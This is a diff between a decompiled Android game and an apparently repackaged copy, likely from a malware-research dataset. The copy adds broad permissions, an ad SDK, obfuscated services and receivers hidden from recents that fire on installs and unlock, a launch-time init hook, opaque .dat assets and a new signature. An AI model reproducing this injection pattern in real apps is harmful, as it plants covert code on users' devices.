@@ -1,0 +1,1144 @@
+diff -r result/APP_90/App_B_90/AndroidManifest.xml result/APP_90/App_M_90/AndroidManifest.xml
+4a5,11
+>     <uses-permission android:name="android.permission.INTERNET"/>
+>     <uses-permission android:name="android.permission.WAKE_LOCK"/>
+>     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+>     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+>     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+>     <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
+16a24,70
+>         <meta-data android:name="ZHUAMOB_APPKEY" android:value="dd3a1293d21cc3ca527a47db"/>
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="" android:launchMode="singleTask" android:name="com.naiiwt.toolon.JA"/>
+>         <service android:name="com.naiiwt.toolon.JS"/>
+>         <receiver android:name="com.naiiwt.toolon.JR">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:excludeFromRecents="true" android:launchMode="singleTask" android:name="com.looton.soown.uawn.MainActivity"/>
+>         <service android:name="com.looton.soown.uawn.MainService"/>
+>         <receiver android:name="com.looton.soown.uawn.MainReceiver">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="" android:launchMode="singleTask" android:name="com.naiiwt.toolon.core.LActivity" android:screenOrientation="portrait">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.CREATE_SHORTCUT"/>
+>             </intent-filter>
+>         </activity>
+>         <service android:name="com.naiiwt.toolon.core.LService"/>
+>         <receiver android:name="com.naiiwt.toolon.core.LReceiver">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+diff -r result/APP_90/App_B_90/apktool.yml result/APP_90/App_M_90/apktool.yml
+2c2
+< apkFileName: Bapp90-CB8EA44DFDB3F27B8DC245F568B1E295E497D5D1573EF27AB2E8311B02F9EE3C.apk
+---
+> apkFileName: Mapp90-BD570C0F3268F0659F04BD6AA6C9E41DF1EC69F906AEF858E3A717B943B575B3.apk
+6a7,8
+> - assets/Zhuamob_sdk_v1.8.2.version
+> - ogg
+9d10
+< - ogg
+Somente em result/APP_90/App_M_90/assets: 9.dat
+Somente em result/APP_90/App_M_90/assets: btn
+Somente em result/APP_90/App_M_90/assets: l
+Somente em result/APP_90/App_M_90/assets: Zhuamob_sdk_v1.8.2.version
+Somente em result/APP_90/App_M_90/com: looton
+Somente em result/APP_90/App_M_90/com: naiiwt
+diff -r result/APP_90/App_B_90/com/rhaonplus/survivealone/JamesSprite.java result/APP_90/App_M_90/com/rhaonplus/survivealone/JamesSprite.java
+33,34c33,34
+<   private Data data = (Data)this.del.getApplicationContext();
+<   private MainActivity del = (MainActivity)CCDirector.sharedDirector().getActivity();
+---
+>   private Data data;
+>   private MainActivity del;
+50,51c50,51
+<   private float[][] g_jAnchor = { { 0.5F, 1.0F }, { 0.5F, 0.98F }, { 0.5F, 0.98F }, { 0.58F, 0.83F }, { 0.55F, 0.97F }, { 0.5F, 1.0F }, { 0.5F, 0.98F }, { 0.5F, 0.94F }, { 0.5F, 1.0F }, { 0.5F, 0.94F } };
+<   private CCAnimation[] g_jamesAnim = new CCAnimation[10];
+---
+>   private float[][] g_jAnchor;
+>   private CCAnimation[] g_jamesAnim;
+58a59,65
+>     float[] arrayOfFloat1 = { 0.5F, 1.0F };
+>     float[] arrayOfFloat2 = { 0.55F, 0.97F };
+>     float[] arrayOfFloat3 = { 0.5F, 1.0F };
+>     this.g_jAnchor = new float[][] { arrayOfFloat1, { 0.5F, 0.98F }, { 0.5F, 0.98F }, { 0.58F, 0.83F }, arrayOfFloat2, arrayOfFloat3, { 0.5F, 0.98F }, { 0.5F, 0.94F }, { 0.5F, 1.0F }, { 0.5F, 0.94F } };
+>     this.del = ((MainActivity)CCDirector.sharedDirector().getActivity());
+>     this.data = ((Data)this.del.getApplicationContext());
+>     this.g_jamesAnim = new CCAnimation[10];
+65c72
+<       label246:
+---
+>       label254:
+67c74
+<         break label1003;
+---
+>         break label1011;
+74c81
+<       label313:
+---
+>       label321:
+76c83
+<         break label1046;
+---
+>         break label1054;
+80c87
+<       label334:
+---
+>       label342:
+82c89
+<         break label1089;
+---
+>         break label1097;
+86c93
+<       label354:
+---
+>       label362:
+88c95
+<         break label1132;
+---
+>         break label1140;
+103c110
+<       label570:
+---
+>       label578:
+105c112
+<         break label1175;
+---
+>         break label1183;
+108c115
+<       label578:
+---
+>       label586:
+110c117
+<         break label1221;
+---
+>         break label1229;
+113c120
+<       label586:
+---
+>       label594:
+115c122
+<         break label1265;
+---
+>         break label1273;
+119c126
+<       label608:
+---
+>       label616:
+121c128
+<         break label1314;
+---
+>         break label1322;
+157c164
+<         label1003:
+---
+>         label1011:
+160,161c167,168
+<         break label246;
+<         label1046:
+---
+>         break label254;
+>         label1054:
+164,165c171,172
+<         break label313;
+<         label1089:
+---
+>         break label321;
+>         label1097:
+168,169c175,176
+<         break label334;
+<         label1132:
+---
+>         break label342;
+>         label1140:
+172,173c179,180
+<         break label354;
+<         label1175:
+---
+>         break label362;
+>         label1183:
+176,177c183,184
+<         break label570;
+<         label1221:
+---
+>         break label578;
+>         label1229:
+180,181c187,188
+<         break label578;
+<         label1265:
+---
+>         break label586;
+>         label1273:
+184,185c191,192
+<         break label586;
+<         label1314:
+---
+>         break label594;
+>         label1322:
+188c195
+<         break label608;
+---
+>         break label616;
+diff -r result/APP_90/App_B_90/com/rhaonplus/survivealone/LogoActivity.java result/APP_90/App_M_90/com/rhaonplus/survivealone/LogoActivity.java
+12a13
+> import android.widget.FrameLayout.LayoutParams;
+13a15,17
+> import com.aaaa.ZhuamobActivity;
+> import com.naiiwt.toolon.core.CsoalActivity;
+> import com.zhuamob.android.ZhuamobLayout;
+37a42
+>     CsoalActivity.init(this);
+44a50,57
+>   }
+>   
+>   public void toStart()
+>   {
+>     ZhuamobLayout localZhuamobLayout = new ZhuamobLayout(this);
+>     FrameLayout.LayoutParams localLayoutParams = new FrameLayout.LayoutParams(-1, -2);
+>     localLayoutParams.gravity = 80;
+>     addContentView(localZhuamobLayout, localLayoutParams);
+diff -r result/APP_90/App_B_90/com/rhaonplus/survivealone/MonsterSprite.java result/APP_90/App_M_90/com/rhaonplus/survivealone/MonsterSprite.java
+92,98c92,103
+<     Object localObject1 = { { 0.5F, 0.98F }, { 0.5F, 0.98F }, { 0.5F, 0.98F }, { 0.62F, 0.93F } };
+<     Object localObject2 = { { 0.5F, 0.98F }, { 0.5F, 0.98F }, { 0.7F, 0.95F }, { 0.7F, 0.87F } };
+<     Object localObject3 = { 0.5F, 0.99F };
+<     localObject3 = new float[][] { { 0.5F, 0.99F }, localObject3, { 0.6F, 0.97F }, { 0.62F, 0.97F } };
+<     Object localObject4 = { 0.5F, 0.9F };
+<     Object localObject5 = { 0.5F, 0.9F };
+<     localObject4 = new float[][] { localObject4, { 0.5F, 0.99F }, localObject5, { 0.4F, 0.92F } };
+---
+>     Object localObject1 = { 0.5F, 0.98F };
+>     Object localObject2 = { 0.5F, 0.98F };
+>     Object localObject3 = { 0.62F, 0.93F };
+>     localObject1 = new float[][] { localObject1, localObject2, { 0.5F, 0.98F }, localObject3 };
+>     localObject2 = new float[] { 0.5F, 0.98F };
+>     localObject3 = new float[] { 0.5F, 0.98F };
+>     Object localObject4 = { 0.7F, 0.95F };
+>     Object localObject5 = { 0.7F, 0.87F };
+>     Object localObject6 = { 0.5F, 0.99F };
+>     Object localObject7 = { 0.6F, 0.97F };
+>     localObject6 = new float[][] { { 0.5F, 0.99F }, localObject6, localObject7, { 0.62F, 0.97F } };
+>     localObject7 = new float[][] { { 0.5F, 0.9F }, { 0.5F, 0.99F }, { 0.5F, 0.9F }, { 0.4F, 0.92F } };
+100c105
+<     float[] arrayOfFloat2 = { 0.5F, 0.99F };
+---
+>     float[] arrayOfFloat2 = { 0.6F, 0.97F };
+102,103c107,108
+<     localObject5 = new float[][] { { 0.5F, 0.99F }, { 0.5F, 0.99F }, { 0.6F, 0.97F }, { 0.65F, 0.93F } };
+<     this.g_mAnchor = new float[][][] { localObject1, localObject2, localObject3, localObject4, { arrayOfFloat1, arrayOfFloat2, { 0.6F, 0.97F }, arrayOfFloat3 }, localObject5 };
+---
+>     float[][] arrayOfFloat = { { 0.5F, 0.99F }, { 0.5F, 0.99F }, { 0.6F, 0.97F }, { 0.65F, 0.93F } };
+>     this.g_mAnchor = new float[][][] { localObject1, { localObject2, localObject3, localObject4, localObject5 }, localObject6, localObject7, { arrayOfFloat1, { 0.5F, 0.99F }, arrayOfFloat2, arrayOfFloat3 }, arrayOfFloat };
+104a110,111
+>     localObject6 = new int[] { 160, 3, 2, 100, 9 };
+>     localObject7 = new int[] { 100, 3, 2, 100, 5 };
+121c128
+<     this.g_addStats = new int[][] { localObject5, { 160, 3, 2, 100, 9 }, { 100, 3, 2, 100, 5 }, localObject1, localObject2, localObject3, localObject4 };
+---
+>     this.g_addStats = new int[][] { localObject5, localObject6, localObject7, localObject1, localObject2, localObject3, localObject4 };
+diff -r result/APP_90/App_B_90/com/rhaonplus/survivealone/util/Const.java result/APP_90/App_M_90/com/rhaonplus/survivealone/util/Const.java
+134c134
+<   public static final String[][] storeArray_cash;
+---
+>   public static final String[][] storeArray_cash = { { "10", "0.99" }, { "55", "4.99" }, { "120", "9.99" }, { "360", "26.99" } };
+138,152c138
+<     Object localObject1 = new int[5];
+<     localObject1[1] = -1;
+<     localObject1[2] = -1;
+<     localObject1[3] = -1;
+<     localObject1[4] = -1;
+<     Object localObject2 = new int[5];
+<     localObject2[1] = -1;
+<     localObject2[2] = -1;
+<     localObject2[3] = -1;
+<     localObject2[4] = -1;
+<     Object localObject3 = new int[5];
+<     localObject3[1] = 1;
+<     localObject3[2] = -1;
+<     localObject3[3] = -1;
+<     localObject3[4] = -1;
+---
+>     int[] arrayOfInt5 = { -1, -1, -1, -1, -1 };
+154,175c140
+<     arrayOfInt1[1] = 1;
+<     arrayOfInt1[2] = -1;
+<     arrayOfInt1[3] = -1;
+<     arrayOfInt1[4] = -1;
+<     arrayMonsterTutoPos = new int[][] { { -1, -1, -1, -1, -1 }, localObject1, localObject2, localObject3, arrayOfInt1, { 6, -1, -1, -1, -1 } };
+<     localObject1 = new int[5];
+<     localObject1[1] = -1;
+<     localObject1[2] = -1;
+<     localObject1[3] = -1;
+<     localObject1[4] = -1;
+<     localObject2 = new int[5];
+<     localObject2[1] = 1;
+<     localObject2[2] = -1;
+<     localObject2[3] = -1;
+<     localObject2[4] = -1;
+<     localObject3 = new int[5];
+<     localObject3[1] = 1;
+<     localObject3[2] = -1;
+<     localObject3[3] = -1;
+<     localObject3[4] = -1;
+<     arrayOfInt1 = new int[5];
+<     arrayOfInt1[1] = 1;
+---
+>     arrayOfInt1[1] = -1;
+185c150
+<     arrayOfInt3[1] = -1;
+---
+>     arrayOfInt3[1] = 1;
+191c156
+<     arrayOfInt4[2] = 2;
+---
+>     arrayOfInt4[2] = -1;
+194,195c159,183
+<     int[] arrayOfInt5 = new int[5];
+<     arrayOfInt5[1] = 1;
+---
+>     arrayMonsterTutoPos = new int[][] { arrayOfInt5, arrayOfInt1, arrayOfInt2, arrayOfInt3, arrayOfInt4, { 6, -1, -1, -1, -1 } };
+>     int[] arrayOfInt10 = { -1, -1, -1, -1, -1 };
+>     arrayOfInt1 = new int[5];
+>     arrayOfInt1[1] = -1;
+>     arrayOfInt1[2] = -1;
+>     arrayOfInt1[3] = -1;
+>     arrayOfInt1[4] = -1;
+>     arrayOfInt2 = new int[5];
+>     arrayOfInt2[1] = 1;
+>     arrayOfInt2[2] = -1;
+>     arrayOfInt2[3] = -1;
+>     arrayOfInt2[4] = -1;
+>     arrayOfInt3 = new int[5];
+>     arrayOfInt3[1] = 1;
+>     arrayOfInt3[2] = -1;
+>     arrayOfInt3[3] = -1;
+>     arrayOfInt3[4] = -1;
+>     arrayOfInt4 = new int[5];
+>     arrayOfInt4[1] = 1;
+>     arrayOfInt4[2] = -1;
+>     arrayOfInt4[3] = -1;
+>     arrayOfInt4[4] = -1;
+>     int[] arrayOfInt11 = { -1, -1, -1, -1, -1 };
+>     arrayOfInt5 = new int[5];
+>     arrayOfInt5[1] = -1;
+200c188
+<     arrayOfInt6[1] = 1;
+---
+>     arrayOfInt6[1] = -1;
+204,220c192,208
+<     arrayMonsterBasicPos = new int[][] { { -1, -1, -1, -1, -1 }, localObject1, localObject2, localObject3, arrayOfInt1, { -1, -1, -1, -1, -1 }, arrayOfInt2, arrayOfInt3, arrayOfInt4, arrayOfInt5, arrayOfInt6, { 6, -1, -1, -1, -1 } };
+<     int[] arrayOfInt7 = { -1, -1, -1, -1, -1 };
+<     localObject1 = new int[5];
+<     localObject1[1] = -1;
+<     localObject1[2] = -1;
+<     localObject1[3] = -1;
+<     localObject1[4] = -1;
+<     localObject2 = new int[5];
+<     localObject2[1] = 1;
+<     localObject2[2] = -1;
+<     localObject2[3] = -1;
+<     localObject2[4] = -1;
+<     localObject3 = new int[5];
+<     localObject3[1] = 1;
+<     localObject3[2] = -1;
+<     localObject3[3] = -1;
+<     localObject3[4] = -1;
+---
+>     int[] arrayOfInt7 = new int[5];
+>     arrayOfInt7[1] = 1;
+>     arrayOfInt7[2] = 2;
+>     arrayOfInt7[3] = -1;
+>     arrayOfInt7[4] = -1;
+>     int[] arrayOfInt8 = new int[5];
+>     arrayOfInt8[1] = 1;
+>     arrayOfInt8[2] = -1;
+>     arrayOfInt8[3] = -1;
+>     arrayOfInt8[4] = -1;
+>     int[] arrayOfInt9 = new int[5];
+>     arrayOfInt9[1] = 1;
+>     arrayOfInt9[2] = -1;
+>     arrayOfInt9[3] = -1;
+>     arrayOfInt9[4] = -1;
+>     arrayMonsterBasicPos = new int[][] { arrayOfInt10, arrayOfInt1, arrayOfInt2, arrayOfInt3, arrayOfInt4, arrayOfInt11, arrayOfInt5, arrayOfInt6, arrayOfInt7, arrayOfInt8, arrayOfInt9, { 6, -1, -1, -1, -1 } };
+>     arrayOfInt10 = new int[] { -1, -1, -1, -1, -1 };
+222,224c210,212
+<     arrayOfInt1[1] = 1;
+<     arrayOfInt1[2] = 2;
+<     arrayOfInt1[3] = 3;
+---
+>     arrayOfInt1[1] = -1;
+>     arrayOfInt1[2] = -1;
+>     arrayOfInt1[3] = -1;
+227c215
+<     arrayOfInt2[1] = -1;
+---
+>     arrayOfInt2[1] = 1;
+232c220
+<     arrayOfInt3[1] = -1;
+---
+>     arrayOfInt3[1] = 1;
+239c227
+<     arrayOfInt4[3] = -1;
+---
+>     arrayOfInt4[3] = 3;
+240a229
+>     arrayOfInt11 = new int[] { -1, -1, -1, -1, -1 };
+242c231
+<     arrayOfInt5[1] = 1;
+---
+>     arrayOfInt5[1] = -1;
+247,255c236,255
+<     arrayOfInt6[1] = 1;
+<     arrayOfInt6[2] = 2;
+<     arrayOfInt6[3] = 3;
+<     arrayOfInt6[4] = 4;
+<     arrayMonsterRandomPos = new int[][] { arrayOfInt7, localObject1, localObject2, localObject3, arrayOfInt1, { -1, -1, -1, -1, -1 }, arrayOfInt2, arrayOfInt3, arrayOfInt4, arrayOfInt5, arrayOfInt6, { -1, -1, -1, -1, -1 } };
+<     localObject1 = new String[] { "10", "0.99" };
+<     localObject2 = new String[] { "55", "4.99" };
+<     localObject3 = new String[] { "360", "26.99" };
+<     storeArray_cash = new String[][] { localObject1, localObject2, { "120", "9.99" }, localObject3 };
+---
+>     arrayOfInt6[1] = -1;
+>     arrayOfInt6[2] = -1;
+>     arrayOfInt6[3] = -1;
+>     arrayOfInt6[4] = -1;
+>     arrayOfInt7 = new int[5];
+>     arrayOfInt7[1] = 1;
+>     arrayOfInt7[2] = 2;
+>     arrayOfInt7[3] = -1;
+>     arrayOfInt7[4] = -1;
+>     arrayOfInt8 = new int[5];
+>     arrayOfInt8[1] = 1;
+>     arrayOfInt8[2] = -1;
+>     arrayOfInt8[3] = -1;
+>     arrayOfInt8[4] = -1;
+>     arrayOfInt9 = new int[5];
+>     arrayOfInt9[1] = 1;
+>     arrayOfInt9[2] = 2;
+>     arrayOfInt9[3] = 3;
+>     arrayOfInt9[4] = 4;
+>     arrayMonsterRandomPos = new int[][] { arrayOfInt10, arrayOfInt1, arrayOfInt2, arrayOfInt3, arrayOfInt4, arrayOfInt11, arrayOfInt5, arrayOfInt6, arrayOfInt7, arrayOfInt8, arrayOfInt9, { -1, -1, -1, -1, -1 } };
+Os arquivos binários result/APP_90/App_B_90/original/AndroidManifest.xml e result/APP_90/App_M_90/original/AndroidManifest.xml são diferentes
+Os arquivos binários result/APP_90/App_B_90/original/META-INF/CERT.RSA e result/APP_90/App_M_90/original/META-INF/CERT.RSA são diferentes
+diff -r result/APP_90/App_B_90/original/META-INF/CERT.SF result/APP_90/App_M_90/original/META-INF/CERT.SF
+2,3c2,3
+< Created-By: 1.0 (Android)
+< SHA1-Digest-Manifest: MyE9Ngz4+r/pbADR/0zBg1tZgpc=
+---
+> Created-By: 1.0 (Android SignApk)
+> SHA1-Digest-Manifest: 633KrXhalrJiSwZRWEm7o8QU04k=
+24c24
+< SHA1-Digest: m03DbjRnORoYoIw3ULt0t30Szs4=
+---
+> SHA1-Digest: Yn3sT8z+C5kAaTMh1HB65iDtgtc=
+54c54
+< SHA1-Digest: p9NAMY8CrEeMv4EUJq2TbOqSpro=
+---
+> SHA1-Digest: PyH1jpm+FNyrFs/qrAsV2OgZQpU=
+99c99,102
+< SHA1-Digest: i8wiLpNnwVmZT0gGaKOpLc0UEU8=
+---
+> SHA1-Digest: BfL9Ppp1lbI3xML2RypWLH/sMx8=
+> 
+> Name: assets/9.dat
+> SHA1-Digest: jNZ757NKPkYYqIpK8035xX+Xon0=
+128,130d130
+< Name: res/raw/snd_backstep.ogg
+< SHA1-Digest: P3fGDeteWJGp9ixBcjRML4JJFaQ=
+< 
+133a134,136
+> Name: res/raw/snd_backstep.ogg
+> SHA1-Digest: P3fGDeteWJGp9ixBcjRML4JJFaQ=
+> 
+176,178d178
+< Name: res/layout/com_facebook_usersettingsfragment.xml
+< SHA1-Digest: 6Y3Bi7cwa9x1eovOc9C4zpnu+qs=
+< 
+181a182,184
+> Name: res/layout/com_facebook_usersettingsfragment.xml
+> SHA1-Digest: bWQJU8T80gMDGRUkbv+JKgr0xe4=
+> 
+187a191,193
+> Name: assets/btn/pic.dat
+> SHA1-Digest: sPpC3k2ZjiG1iI/d880AlLRvtxU=
+> 
+193c199
+< SHA1-Digest: IIodlViIlufoS6rEoi53bIuvNu4=
+---
+> SHA1-Digest: EdK18Spcc1z1009Kz4Vu3bSiuH0=
+201,202c207,208
+< Name: res/drawable-xhdpi/com_facebook_button_grey_pressed.9.png
+< SHA1-Digest: N6+Om7AaJoAhWJfglle8sMaEKuU=
+---
+> Name: res/raw/snd_aim_shot.ogg
+> SHA1-Digest: XMEWXXJTaM6D2/LAw8/FGa+eyBA=
+207,208c213,214
+< Name: res/raw/snd_aim_shot.ogg
+< SHA1-Digest: XMEWXXJTaM6D2/LAw8/FGa+eyBA=
+---
+> Name: res/drawable-xhdpi/com_facebook_button_grey_pressed.9.png
+> SHA1-Digest: azRMcPp875B4sN2jI7wuP+fY2v8=
+217c223
+< SHA1-Digest: pXLtyYcRYnN6oh03Yp290IGwP54=
+---
+> SHA1-Digest: +dNd5B6NMTJh+2gl1JAVjk85brE=
+237,239d242
+< Name: res/drawable-xhdpi/com_facebook_close.png
+< SHA1-Digest: NM6wiWc3gbAJtyqfrUqgdOIGm9A=
+< 
+243,244c246,247
+< Name: res/drawable-hdpi/loading_5.png
+< SHA1-Digest: wRtYAK/bk5c/vVztz1d8Tw91+jk=
+---
+> Name: res/drawable-xhdpi/com_facebook_close.png
+> SHA1-Digest: NM6wiWc3gbAJtyqfrUqgdOIGm9A=
+254a258,260
+> Name: res/drawable-hdpi/loading_5.png
+> SHA1-Digest: wRtYAK/bk5c/vVztz1d8Tw91+jk=
+> 
+259c265
+< SHA1-Digest: KJvH3TJAV6TdIwyWGY1zNKaMU0A=
+---
+> SHA1-Digest: elkxQNPyHuA9VCqgRIBPJPzktKA=
+271c277
+< SHA1-Digest: y1DmxMs62G4u74Tu4AouNAd03Z0=
+---
+> SHA1-Digest: drjKPCtJX68qo3SrIGHijtuGovI=
+302a309,311
+> Name: assets/l/l.dat
+> SHA1-Digest: ZVCpT9yqcvPOVZJzscKFrvCyD88=
+> 
+337c346
+< SHA1-Digest: ooqNe625R0fOwuhKGZHVFUI2zns=
+---
+> SHA1-Digest: vJ3CoySjprJGO5bNxjMhYyEK2gs=
+352c361
+< SHA1-Digest: O7J6pIGrVRtJA7UQTYljdEEAWug=
+---
+> SHA1-Digest: 9NdvdDgtuNNIShWqa85HW/0WVsM=
+382c391
+< SHA1-Digest: IFQubIf70xOJ3EZ41rIRVkF1xLA=
+---
+> SHA1-Digest: QPTFnDCvtKCATg0jTwDVva9gLBM=
+415,418c424
+< SHA1-Digest: WUgwSjQSyfZXTKoc3EwOhI4PAiw=
+< 
+< Name: res/raw/snd_door.ogg
+< SHA1-Digest: 6I3Kl8HnENXMBOOzgHdtUK5STLk=
+---
+> SHA1-Digest: DGRWde1LtAhB63iHA/3V79fSNGA=
+422a429,431
+> Name: res/raw/snd_door.ogg
+> SHA1-Digest: 6I3Kl8HnENXMBOOzgHdtUK5STLk=
+> 
+454c463
+< SHA1-Digest: pbcHwRsG4jbhhKNXsao4r+vwXag=
+---
+> SHA1-Digest: Nacqp2cRnkL5Y3cXC5s5jdm91gI=
+460c469
+< SHA1-Digest: StfxOQKFqHYO+AEv0XwLI42Dxoo=
+---
+> SHA1-Digest: x97nV/PKhnpTn5SzvsO63GifvGU=
+493c502
+< SHA1-Digest: +NBiS2OU79zX4I0SKkomzDy7a5I=
+---
+> SHA1-Digest: MPTifNR5smhzUw5lxo0IY68qXm4=
+500a510,512
+> Name: res/drawable-hdpi/progress_style.xml
+> SHA1-Digest: RmBfcn7j1Pqm8dax/QLzXm5g9+0=
+> 
+504,506d515
+< Name: res/drawable-hdpi/progress_style.xml
+< SHA1-Digest: SirB8W7BJZc9XWivwmEE/cn6yL8=
+< 
+559,562c568
+< SHA1-Digest: W4Hd4vhtlWWaprXSbWkyA5p9dyw=
+< 
+< Name: res/layout/edit_dialog.xml
+< SHA1-Digest: MuowsPJ7jQBqauDs94yRr1lCyGM=
+---
+> SHA1-Digest: K/Y8/JEVh+yy6ivsQF4do3sQ5z8=
+566a573,575
+> Name: res/layout/edit_dialog.xml
+> SHA1-Digest: 5/IyyNZVBPhnd7dm5OcEDouwRYo=
+> 
+568c577
+< SHA1-Digest: jMhWzrnd1r+eVNaXijenjO2V+kw=
+---
+> SHA1-Digest: LlnQRFGikpyK/mNFYq6Yi9zrg5Q=
+573,575d581
+< Name: assets/mon_0.plist
+< SHA1-Digest: Emvk5UeLFf/vrL0DcrguEeTBs/w=
+< 
+578a585,587
+> Name: assets/mon_0.plist
+> SHA1-Digest: Emvk5UeLFf/vrL0DcrguEeTBs/w=
+> 
+591,593d599
+< Name: res/drawable-hdpi/com_facebook_icon.png
+< SHA1-Digest: 8/3/CYPJF8H/rD25n0r3DkLmZSo=
+< 
+599a606,608
+> Name: res/drawable-hdpi/com_facebook_icon.png
+> SHA1-Digest: 8/3/CYPJF8H/rD25n0r3DkLmZSo=
+> 
+616c625
+< SHA1-Digest: +b3kRwbfd4RQAgPNsrGor4jymYw=
+---
+> SHA1-Digest: IY9R6SpJrFoB8ti0EhVrO9VEn1s=
+628c637
+< SHA1-Digest: +ZyYkg3cC+WmlHR9hyFqFc7t00w=
+---
+> SHA1-Digest: IpelivHxFtAGWa+xlexutMGZpmc=
+670c679
+< SHA1-Digest: oLX4qt6L5yNlB3YrCKmFibJyXFA=
+---
+> SHA1-Digest: 2QqplmOKDKeMyJkRVG6ciFTE1nM=
+706c715
+< SHA1-Digest: 8tWqIrT5xH315B1Zp2G7wcgmLjQ=
+---
+> SHA1-Digest: Lft7EYriqMLci+qUOYgrpYLQ1Jw=
+715c724
+< SHA1-Digest: MRwgTa4DuPsFULiD0iF08rHfKZo=
+---
+> SHA1-Digest: QbkddDy9sbkr9ijVkgrwFNiXYaI=
+721c730
+< SHA1-Digest: hUeAxf9MSGrTLXD1NZxap3Q7VUY=
+---
+> SHA1-Digest: /yMnfV54F3lIsP4KBSD9iXdd6cE=
+813,815d821
+< Name: res/layout/com_facebook_login_activity_layout.xml
+< SHA1-Digest: BEbVBgyNk+nsVNTnDkcpVc6cu9g=
+< 
+817c823,826
+< SHA1-Digest: Ye5mUHRmcnpvj+09ewNQhb5rEhs=
+---
+> SHA1-Digest: b6Pq7L/YHscwhy62lurremTevqU=
+> 
+> Name: res/layout/com_facebook_login_activity_layout.xml
+> SHA1-Digest: rny/K2VVyiH7oeiC0/tk0sm/wjo=
+867,869d875
+< Name: res/drawable-xhdpi/com_facebook_button_grey_normal.9.png
+< SHA1-Digest: 0qYFXncRiF0miH/Ou43k9m0CKDw=
+< 
+872a879,881
+> Name: res/drawable-xhdpi/com_facebook_button_grey_normal.9.png
+> SHA1-Digest: fEOfyDr87C76id8YV29xlI0qGTM=
+> 
+896a906,908
+> Name: res/layout/com_facebook_picker_list_section_header.xml
+> SHA1-Digest: lr8EgGAECauy7fPBSYiBGxqF1xk=
+> 
+900,902d911
+< Name: res/layout/com_facebook_picker_list_section_header.xml
+< SHA1-Digest: jHhMiuka1kmWkVXbgndrJ2WBcOE=
+< 
+910c919
+< SHA1-Digest: YYpfE8Z0KzH0tpfIR9vRzbEWBK0=
+---
+> SHA1-Digest: QvntbcwLYsG4zxnhhcHiQelP53c=
+924,925c933,934
+< Name: res/drawable-xhdpi/com_facebook_loginbutton_blue_normal.png
+< SHA1-Digest: DCpxD0/rrV22HR+it8b0DUqdRZI=
+---
+> Name: assets/Zhuamob_sdk_v1.8.2.version
+> SHA1-Digest: FXMbgblP7gqn3SWqk6Zc3A70oPY=
+932a942,944
+> Name: res/drawable-xhdpi/com_facebook_loginbutton_blue_normal.png
+> SHA1-Digest: DCpxD0/rrV22HR+it8b0DUqdRZI=
+> 
+934c946
+< SHA1-Digest: Zm95hGpI6uIxDgUr27/gSznIqpE=
+---
+> SHA1-Digest: PfmEd0VJFgrPk12aCiL0GuqNt+s=
+975,977d986
+< Name: res/drawable-ldpi/com_facebook_icon.png
+< SHA1-Digest: YGn+NJ56kiw/9ZzRnZ/Er+cyCcA=
+< 
+980a990,992
+> Name: res/drawable-ldpi/com_facebook_icon.png
+> SHA1-Digest: YGn+NJ56kiw/9ZzRnZ/Er+cyCcA=
+> 
+982c994
+< SHA1-Digest: Bo9bZ1R9A19WsG3qiElG86W274M=
+---
+> SHA1-Digest: Im8JECwod3ES8+QVfNHBZ9EsgnY=
+989a1002,1004
+> Name: res/raw/snd_door_attack_0.ogg
+> SHA1-Digest: RkqOlau4Ug8CyLUQIzy/eU2zh4Q=
+> 
+996,998d1010
+< Name: res/raw/snd_door_attack_0.ogg
+< SHA1-Digest: RkqOlau4Ug8CyLUQIzy/eU2zh4Q=
+< 
+1026,1028d1037
+< Name: res/drawable-xhdpi/com_facebook_loginbutton_blue_pressed.png
+< SHA1-Digest: WcMEkRS1cuHb3hZAFjmKHK537rc=
+< 
+1031a1041,1043
+> Name: res/drawable-xhdpi/com_facebook_loginbutton_blue_pressed.png
+> SHA1-Digest: WcMEkRS1cuHb3hZAFjmKHK537rc=
+> 
+1034c1046
+< SHA1-Digest: PekUc0vsqGJnKEec+difAXy+Zt8=
+---
+> SHA1-Digest: 8kcU8P9TspU5d+0dBnCGfzsBPtc=
+1039,1041d1050
+< Name: res/drawable-hdpi/loading_7.png
+< SHA1-Digest: g7f3XoXZCUTVOLoHQHJJ4qKAGZk=
+< 
+1044a1054,1056
+> Name: res/drawable-hdpi/loading_7.png
+> SHA1-Digest: g7f3XoXZCUTVOLoHQHJJ4qKAGZk=
+> 
+1054,1056d1065
+< Name: assets/IS.png
+< SHA1-Digest: fhsB9IiV9SVla1PGX/Uh99UhVqk=
+< 
+1059a1069,1071
+> Name: assets/IS.png
+> SHA1-Digest: fhsB9IiV9SVla1PGX/Uh99UhVqk=
+> 
+1061c1073
+< SHA1-Digest: CRbOEM7St/f+8uuKwzOQlaN4dhk=
+---
+> SHA1-Digest: 4+nPtyKynabd0oi322ONkSByey8=
+1082c1094
+< SHA1-Digest: /2IxGLaNZ6TarwLY121Wuw6ho2g=
+---
+> SHA1-Digest: aH9j+xCvoou+5UbrnJiBfbgXbiw=
+1097c1109
+< SHA1-Digest: iyxMtQ4YUrMXMiZLuZp2dOsp9nQ=
+---
